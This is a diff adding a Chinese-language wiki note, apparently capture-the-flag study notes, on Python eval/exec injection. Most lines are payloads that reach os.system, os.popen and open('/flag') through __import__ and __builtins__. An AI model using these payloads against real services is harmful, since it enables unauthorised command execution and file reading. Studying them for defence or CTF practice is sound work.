@@ -1,0 +1,38 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+Creation-Date: 2024-11-24T22:34:05+08:00
+
+====== eval恶意代码执行 ======
+Created 星期日 24 十一月 2024
+
+https://docs.python.org/3.8/
+
+eval使用逗号分隔多行指令（当作列表处理），赋值使用列表内的海象符:=：
+eval('expr1, expr2') -> list
+eval('[a:=1, b:=2]')
+
+exec支持执行多行指令，用分号隔开:
+exec('expr1; expr2')
+
+使用 ''__import__(库名)'' 动态加载库
+''eval('__import__('os').listdir()')''
+
+os.listdir() -> list
+os.system(cmd) -> None
+os.popen(cmd).read() -> str
+open('file', 'r').read() -> str
+
+dir(package)  查看库里的所有方法
+
+''__builtins__ -> dict''
+''__builtins__''包含的常用函数：eval、exec、''__import__''
+''dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__build_class__', '__import__', 'abs', 'all', 'any', 'ascii', 'bin', 'breakpoint', 'callable', 'chr', 'compile', 'delattr', 'dir', 'divmod', 'eval', 'exec', 'format', 'getattr', 'globals', 'hasattr', 'hash', 'hex', 'id', 'input', 'isinstance', 'issubclass', 'iter', 'len', 'locals', 'max', 'min', 'next', 'oct', 'ord', 'pow', 'print', 'repr', 'round', 'setattr', 'sorted', 'sum', 'vars', 'None', 'Ellipsis', 'NotImplemented', 'False', 'True', 'bool', 'memoryview', 'bytearray', 'bytes', 'classmethod', 'complex', 'dict', 'enumerate', 'filter', 'float', 'frozenset', 'property', 'int', 'list', 'map', 'object', 'range', 'reversed', 'set', 'slice', 'staticmethod', 'str', 'super', 'tuple', 'type', 'zip', '__debug__', 'BaseException', 'Exception', 'TypeError', 'StopAsyncIteration', 'StopIteration', 'GeneratorExit', 'SystemExit', 'KeyboardInterrupt', 'ImportError', 'ModuleNotFoundError', 'OSError', 'EnvironmentError', 'IOError', 'WindowsError', 'EOFError', 'RuntimeError', 'RecursionError', 'NotImplementedError', 'NameError', 'UnboundLocalError', 'AttributeError', 'SyntaxError', 'IndentationError', 'TabError', 'LookupError', 'IndexError', 'KeyError', 'ValueError', 'UnicodeError', 'UnicodeEncodeError', 'UnicodeDecodeError', 'UnicodeTranslateError', 'AssertionError', 'ArithmeticError', 'FloatingPointError', 'OverflowError', 'ZeroDivisionError', 'SystemError', 'ReferenceError', 'MemoryError', 'BufferError', 'Warning', 'UserWarning', 'DeprecationWarning', 'PendingDeprecationWarning', 'SyntaxWarning', 'RuntimeWarning', 'FutureWarning', 'ImportWarning', 'UnicodeWarning', 'BytesWarning', 'ResourceWarning', 'ConnectionError', 'BlockingIOError', 'BrokenPipeError', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionRefusedError', 'ConnectionResetError', 'FileExistsError', 'FileNotFoundError', 'IsADirectoryError', 'NotADirectoryError', 'InterruptedError', 'PermissionError', 'ProcessLookupError', 'TimeoutError', 'open', 'quit', 'exit', 'copyright', 'credits', 'license', 'help', 'execfile', 'runfile', '_'])''
+
+''__builtins__['eval']('cmd')''
+''__builtins__.__import__('os').system('ls') 无返回值''
+''__builtins__.__import__('os').popen('ls').read() 返回字符串''
+''__builtins__.__getitem__('open')('/flag').read() 返回字符串''
+
+
+整理：
+{{.\pasted_image.png}}
